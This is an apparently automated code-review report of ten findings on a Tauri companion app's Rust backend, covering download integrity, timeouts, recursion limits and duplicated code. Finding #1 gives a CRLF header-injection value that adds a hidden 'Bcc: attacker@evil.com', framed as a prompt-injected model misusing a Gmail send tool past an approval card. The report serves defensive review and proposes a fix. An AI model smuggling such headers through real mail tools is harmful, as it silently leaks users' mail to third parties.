> Context: tauri:companion (misc)
> Total: 10
> Critical: 0  High: 2  Medium: 5  Low: 3

## 1. Gmail send_message allows CRLF header injection via `to`/`subject`
- **Lens**: bug-hunter
- **Severity**: high
- **Category**: trust-boundary
- **File**: src-tauri/src/companion/jobs/connector_use.rs:697-709
- **Scenario**: `gmail_send_message` builds the RFC-822 message by interpolating model-supplied `to` and `subject` straight into headers: `format!("To: {to}\r\nSubject: {subject}\r\n…")`. If a (prompt-injected) model passes `subject = "Hi\r\nBcc: attacker@evil.com"`, the injected `Bcc:` becomes a real header and the mail silently CCs a third party. The whole blob is then base64url-encoded and posted to Gmail as `raw`, so Gmail honors the injected headers.
- **Root cause**: header values are treated as opaque text but placed in a CRLF-delimited header block with no sanitization; the approval card shows `action`/`rationale`, not the assembled headers, so the operator can't see the smuggled recipient.
- **Impact**: security — exfiltration of outbound mail / silent extra recipients on an approval-gated write path.
- **Fix sketch**: reject or strip `\r`/`\n` (and control chars) from `to` and `subject` before assembling the message; return a validation error if present. Consider building the MIME message via a library rather than string concat.

## 2. STT model download finalizes a truncated file as "complete" (no size/integrity check)
- **Lens**: bug-hunter
- **Severity**: high
- **Category**: silent-failure
- **File**: src-tauri/src/companion/stt/downloader.rs:158-201
- **Scenario**: `stream_to_file` loops over `bytes_stream()` and, when the stream ends, flushes and `rename`s the `.partial` into the final `ggml-<id>.bin`. If the upstream connection closes early *without* yielding a chunk `Err` (proxy/CDN truncation, dropped keep-alive), the loop simply ends: `downloaded` may be far below `total`, yet a truncated model is renamed into place. `is_model_downloaded` then returns true, `download_model` short-circuits future attempts (line 106-109), and `whisper.rs::transcribe` later spawns the sidecar against a corrupt model, failing with an opaque non-zero-exit error the user can't self-heal from.
- **Root cause**: no assertion that `downloaded == total` (when `content_length` is known) and no checksum; success is inferred purely from "the stream ended".
- **Impact**: data/UX — corrupt model wedged on disk, feature permanently broken until the user manually deletes the file. (The `.tar.bz2` installers are safer because bzip2 CRC catches truncation at extract time; the raw `.bin` has no such guard.)
- **Fix sketch**: after the loop, if `let Some(total)` and `downloaded != total`, delete the partial and return an error. Ideally verify a known SHA against the catalog entry before the rename.

## 3. MCP `REQUEST_TTL` is never enforced for an idle hub — blocking call hangs past its documented timeout
- **Lens**: bug-hunter
- **Severity**: medium
- **Category**: silent-failure
- **File**: src-tauri/src/companion/orchestration/mcp/pending.rs:84-91,145-158 + handlers.rs:245,299
- **Scenario**: the module docs promise "pending requests are dropped if not resolved within REQUEST_TTL". But `sweep_expired` only runs inside `submit` (line 91). The awaiting handler does a bare `rx.await` (handlers.rs:245 / 299) with no `tokio::time::timeout`. So if a user ignores one approval card and *no further MCP request is ever submitted*, nothing ever calls `sweep_expired`, the oneshot never fires, and the blocking claude session waits indefinitely — well beyond the 10-minute TTL. Only `cancel_for_session` (on session exit) or a later `submit` unblocks it.
- **Root cause**: TTL enforcement is piggy-backed on new-request traffic instead of a timer; the receiver side has no independent timeout.
- **Impact**: UX/reliability — a stuck session can hang for far longer than the advertised bound.
- **Fix sketch**: wrap the `rx.await` in `tokio::time::timeout(REQUEST_TTL, rx)`, mapping elapsed → "request expired" and draining the pending entry; or spawn a per-request delayed sweeper.

## 4. `local_drive_count_files` has no cycle/entry cap and follows symlinks — can loop unbounded
- **Lens**: bug-hunter
- **Severity**: medium
- **Category**: edge-case
- **File**: src-tauri/src/companion/jobs/connector_use.rs:1108-1150
- **Scenario**: the recursive count uses a `stack` and `path.is_dir()` (which follows symlinks/junctions) with no visited-set, depth cap, or entry cap. A symlink/junction cycle inside the managed drive (`a/ -> ../`) makes the walk push directories forever, and this is an *auto-fire* capability (not approval-gated), so a single `count_files` call can pin a worker indefinitely. Note `scan_codebase.rs` deliberately added `MAX_FILES_WALKED` + `WALK_TIMEOUT_SECS` for exactly this hazard; `count_files` never got the same guard.
- **Root cause**: sandbox recursion assumes a well-behaved tree; no bound on entries walked or symlink loops.
- **Impact**: DoS/hang of the job worker.
- **Fix sketch**: cap total entries and/or wall-clock, and skip symlinked directories (`entry.file_type().is_symlink()` / `follow_links(false)` via `walkdir`), mirroring `scan_codebase`.

## 5. `athena.checkpoint` silently discards the checkpoint when the session isn't registered yet
- **Lens**: bug-hunter
- **Severity**: medium
- **Category**: silent-failure
- **File**: src-tauri/src/companion/orchestration/mcp/handlers.rs:192-202 + operative_memory.rs:565-582
- **Scenario**: `record_checkpoint` returns `false` when no operation yet owns the session (the MCP call racing ahead of the SessionStart hook). The handler treats that as "soft success" and returns `"checkpoint deferred (session not yet registered)"` — but the progress/blockers text is *thrown away*, not queued. The comment claims "the next state-change event will register the session and Athena can re-query for checkpoints later", yet there is nothing to re-query: the content never persisted anywhere. A blocker reported in the first moments of a session (the most valuable time) is lost.
- **Root cause**: no pending buffer for pre-registration checkpoints; "deferred" is a euphemism for "dropped".
- **Impact**: data loss (lost blocker/progress signal Athena relies on for intervention).
- **Fix sketch**: stash unattached checkpoints in a small per-session pending vec keyed by `fleet_session_id`, flushed into the SessionRef when `ensure_op_for_session` first materializes it; or create the ad-hoc op here instead of dropping.

## 6. `download_to_file` duplicated verbatim between the two installers
- **Lens**: code-refactor
- **Severity**: medium
- **Category**: duplication
- **File**: src-tauri/src/companion/tts/kokoro_installer.rs:187-240 · src-tauri/src/companion/tts/pocket_installer.rs:189-242
- **Scenario**: the two `download_to_file` fns are byte-for-byte identical (same throttle constants, same create/write/flush/emit loop). `stt/downloader.rs::stream_to_file` is a third near-twin (adds the `.partial` rename). Verified by side-by-side read — only the enclosing module differs.
- **Root cause**: each engine's installer was written by cloning the previous one; no shared streaming-download utility.
- **Impact**: maintainability — the size-verification fix from finding #2 would have to be applied in three places; drift risk.
- **Fix sketch**: extract a shared `download::stream_to_file(client, url, dest, progress_cb)` (e.g. under `companion::tts` or a common `engine::download` module) and have all three call it with a phase/emit closure.

## 7. `extract_model` near-duplicated across the two TTS installers
- **Lens**: code-refactor
- **Severity**: low
- **Category**: duplication
- **File**: src-tauri/src/companion/tts/kokoro_installer.rs:244-300 · src-tauri/src/companion/tts/pocket_installer.rs:246-302
- **Scenario**: both `extract_model` fns share the full bzip2→tar→strip-prefix→keep-filter→unpack skeleton and the `found_model` sentinel; they differ only in the `keep` predicate and the marker filename. `sherpa_engine::extract_engine` already demonstrates the "shared extractor" pattern for the binary.
- **Root cause**: same clone-the-installer history as #6.
- **Impact**: maintainability.
- **Fix sketch**: `fn extract_selected(archive, dest, prefix, keep: impl Fn(&str)->bool, marker: &str)`; both installers pass a closure + marker.

## 8. Per-service upstream-error markdown is copy-pasted ~15× in `connector_use`
- **Lens**: code-refactor
- **Severity**: medium
- **Category**: duplication
- **File**: src-tauri/src/companion/jobs/connector_use.rs:228-233,296-301,384-389,459-464,536-541,624-629,681-686,725-730,771-776,828-833,877-882,965-970,998-1003,1195-1200,1260-1266
- **Scenario**: nearly every handler repeats the identical shape: `let status = resp.status(); let body = resp.text().await.unwrap_or_default(); if !status.is_success() { return Ok(format!("## X failed … {status} … {}", truncate_for_episode(&body, 500))) }`. Fifteen literal copies differing only in the service label.
- **Root cause**: no shared helper for the "HTTP failed → friendly markdown episode" path.
- **Impact**: maintainability — the handler body dominates a 1447-line file; changing the error format (or the 500-char cap) is a 15-site edit.
- **Fix sketch**: `fn upstream_err_md(service_label: &str, status: StatusCode, body: &str) -> String` and reduce each site to `if !status.is_success() { return Ok(upstream_err_md("Sentry — list_issues", status, &body)); }`.

## 9. Redundant truncation helpers; `truncate_for_episode` mixes byte-length test with char-count truncation
- **Lens**: code-refactor
- **Severity**: low
- **Category**: duplication
- **File**: src-tauri/src/companion/jobs/connector_use.rs:184-192 (vs operative_memory.rs:1041-1054 `truncate`/`truncate_one_line` and `crate::utils::text::truncate_on_char_boundary`)
- **Scenario**: three parallel truncation helpers exist across the context. `truncate_for_episode` gates on `s.len()` (bytes) but truncates with `s.chars().take(max)` (chars) — inconsistent units, so a multibyte string can be truncated on a mismatched threshold. `operative_memory::truncate` and `utils::text::truncate_on_char_boundary` already do this correctly.
- **Root cause**: helper written locally instead of reusing the existing char-boundary utility.
- **Impact**: maintainability + minor correctness (units mismatch).
- **Fix sketch**: delete `truncate_for_episode` and call `crate::utils::text::truncate_on_char_boundary` everywhere; if the ellipsis behavior differs, add one shared variant.

## 10. `connector_use.rs` is a 1447-line god-module (router + 15 service handlers + drive sandbox + SQL exec)
- **Lens**: code-refactor
- **Severity**: low
- **Category**: oversized-module
- **File**: src-tauri/src/companion/jobs/connector_use.rs:1-1447
- **Scenario**: one file holds the dispatcher, every per-service HTTP handler (Sentry/GitHub/Slack/Gmail/Discord/Notion/ElevenLabs), the local-drive sandbox (`resolve_within`, list/count/write), and the SQLite exec surface. The module doc even says "new services slot in as additional match arms" — a growth pattern that guarantees continued bloat.
- **Root cause**: organic accretion; no per-service submodule boundary.
- **Impact**: maintainability/navigability; makes findings #1, #8 harder to spot.
- **Fix sketch**: split into `connector_use/{mod.rs (dispatch), sentry.rs, github.rs, gmail.rs, drive.rs, personas_db.rs, …}`; keep `dispatch_capability`'s match arms delegating to submodules.
